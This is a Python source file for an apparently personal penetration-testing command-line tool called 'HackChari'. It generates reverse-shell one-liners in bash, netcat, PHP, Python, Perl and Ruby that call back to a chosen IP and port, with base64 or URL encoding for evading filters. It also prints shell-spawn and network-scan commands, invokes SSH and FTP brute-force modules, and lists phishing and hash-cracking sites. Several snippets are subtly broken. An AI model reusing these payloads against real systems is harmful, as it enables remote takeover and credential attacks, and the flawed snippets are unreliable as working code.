#Autor rodolfomarianocy
#rodolfomarianocy/in/linkedin.com
#rodolfomarianocy@medium.com
import sys
import urllib
import base64
from src.bfhackchari import Bruteforcessh
from src.bfhackchari import Bruteforceftp
from src.gwhackchari import Generateword
from src.crhackchari import Hashgenerator
#from src.tuhackchari import Tutorial

print("""    __  __           __   ________               _ 
   / / / /___ ______/ /__/ ____/ /_  ____ ______(_)
  / /_/ / __ `/ ___/ //_/ /   / __ \/ __ `/ ___/ / 
 / __  / /_/ / /__/ ,< / /___/ / / / /_/ / /  / /  
/_/ /_/\__,_/\___/_/|_|\____/_/ /_/\__,_/_/  /_/   
                                                   """)
print("\n1- ScannersBash [a]\n2- Reverse Shell [a - Bash | b - Payload NetCat | c - PHP | d - Python | e - Perl | f - Ruby -> + IP  Port Encode(b64, urle)]\n3- Spawn Shells [a - Python | b - Perl | c - Ruby]\n4- Bypass [a - Long IP -> + IP]\n5- Brute Force [a - SSH -> + IP  Login  Pass.txt | b - FTP -> IP  arquivo.txt(login:password)] \n6- Gerador de WordList [a -> + Characters Min Max]\n7- Hash [a  Characteres]\n8- Tutorial Vulns Web\n9- Others\n10- Websites")

def ScannersBash():
    return print("\nIp Scanner Linux\nfor i in $(seq 1 255);do ping -c xxx.xxx.xxx.$i;done | grep ttl = 64\n\nIp Scanner Windows\nfor i in $(seq 1 255);do ping -c xxx.xxx.xxx.$i;done | grep ttl = 128\n\nBash Port Scanner\nfor port in {1..65535};do echo >/dev/tcp/xxx.xxx.xxx.$target/$port && echo \"Port: $port open\" >> Target-$target ||echo;done;done 2</dev/null")
def ReverseShellBash(ip, port, encode):
    rsba = ''.join(("\nbash -i >& /dev/tcp/"+ip+"/"+port,"0>&1"))
    message_bytes = rsba.encode('ascii')
    if encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('')
        print(base64_message)
    elif encode == 'urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('')
        print(urlencode)
    else:
        print(rsba)
def ReverseShellNetcat(ip, port, encode):
    rsnc = ''.join(("\nmkfifo /tmp/cdlk; nc"+ip,port, "0</tmp/cdlk | /bin/sh 2>&1; rm /tmp/cdlk "))
    message_bytes = rsnc.encode('ascii')
    if encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('')
        print(base64_message)
    elif encode =='urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('')
        print(urlencode)
    else:
        print(rsnc)

def ReverseShellPhp(ip, port,encode):
    rsph = ''.join(("\nphp -r '$sock=fsockopen(" + ip + "," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");'))
    message_bytes = rsph.encode('ascii')
    if encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('')
        print(base64_message)
    elif encode =='urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('')
        print(urlencode)
    else:
        print(rsph)

def ReverseShellPython(ip, port,encode):
    rspy = ''.join(("\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + ip + "," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))
    message_bytes = rspy.encode('ascii')
    if encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('')
        print(base64_message)
    elif encode == 'urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('')
        print(urlencode)
    else:
        print(rspy)
def ReverseShellPerl(ip, port,encode):
    rspe = ''.join(("\nperl -e 'use Socket;$i=" + ip + ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
    message_bytes = rspe.encode('ascii')
    if encode == 'b64':
        message_bytes = rspe.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('')
        print(base64_message)
    elif encode =='urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('')
        print(urlencode)
    else:
        print(rspe)
def ReverseShellRuby(ip, port,encode):
    rsr = ''.join(("\nruby -rsocket -e'f=TCPSocket.open(" + ip + "," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2> &%d\",f,f,f)'"))
    message_bytes = rsr.encode('ascii')
    if encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('')
        print(base64_message)
    elif encode == 'urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('')
        print(urlencode)
    else:
        print(rsr)
def SpawnShellPython():
    return print("\npython -c 'import pty;pty.spawn(\"/bin/bash\")'")
def SpawnShellPerl():
    return print("\nruby 'exec \"/bin/bash\"'")
def SpawnShellRuby():
    return print("\nruby -e 'exec \"/bin/bash\"'")
def Bypass(ip):
    return print("\npython -c\'ip="+ip+";a = ip.split('.');b=reduce(lambda c,d:long(c)*256+long(d),a);print(b)'")
def WebSites():
    return print("\n--OSINT Recon--\nhttps://osintframework.com\nhttps://github.com/CATx003/SPO---Sneak-Peek-OSINT/\n--Whois--\nhttps://who.is/\nhttps://registro.br/\n--Dns Search--\nhttps://searchdns.netcraft.com/\n--Engine & Services Searcher--\nhttps://shodan.io/\n--IP's Range--\nhttps://bgp.he.net/\n--Database Exploit--\nhttps://www.exploit-db.com/\n--Database Exploit Wordpress-\nhttps://wpscan.com/\n--Phishing--\nhttps://getgophish.com/\n--Identify Hashs--\nhttps://hashes.com/en/tools/hash_identifier/\n--Decrypt Hash--\nhttps://hashkiller.io/listmanager\nhttps://www.tunnelsup.com/hash-analyzer/\nhttps://crackstation.net/\n--Reverse shell--\nhttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/\n--Spawn Shell--\nhttps://netsec.ws/?p=337\n--CVSS Calculator--\nhttps://www.first.org/cvss/calculator/3.1/\n--Reverse Shell--\nhttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/\n--Binary Exploitation--\nhttps://gtfobins.github.io/\n--Reports--\nhttps://github.com/juliocesarfort/public-pentesting-reports")
def Help():
    return print("\nUsage python hackchari.py [parameters] \nex: python hackchari.py 2a 192.168.0.20 555 b64")
def Others():
    return print("")

try:
    if sys.argv[1] == "1a":
        ScannersBash()
    elif sys.argv[1] == "2a":
        ReverseShellBash(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "2b":
        ReverseShellNetcat(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1]== "2c":
        ReverseShellPhp(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1]== "2d":
        ReverseShellPython(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1]== "2e":
        ReverseShellPerl(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1]== "2f":
        ReverseShellRuby(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "3a":
        SpawnShellPython()
    elif sys.argv[1] == "3b":
        SpawnShellPerl()
    elif sys.argv[1] == "3c":
        SpawnShellRuby()
    elif sys.argv[1] == "4a":
        Bypass(sys.argv[1])
    elif sys.argv[1] == "5a":
        Bruteforcessh(sys.argv[2], sys.argv[3], open(sys.argv[4]))
    elif sys.argv[1] == "5b":
        Bruteforceftp(sys.argv[2], sys.argv[3])
    elif sys.argv[1] == "6a":
        Generateword(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
    elif sys.argv[1] == "7a":
        Hashgenerator(sys.argv[2])
   # elif sys.argv[1] == "8a":
       # Tutorial()
    elif sys.argv[1] == "9a":
        Others()
    elif sys.argv[1] == "10a":
        WebSites()
    elif sys.argv[1] == "-h":
        Help()
except:
    Help()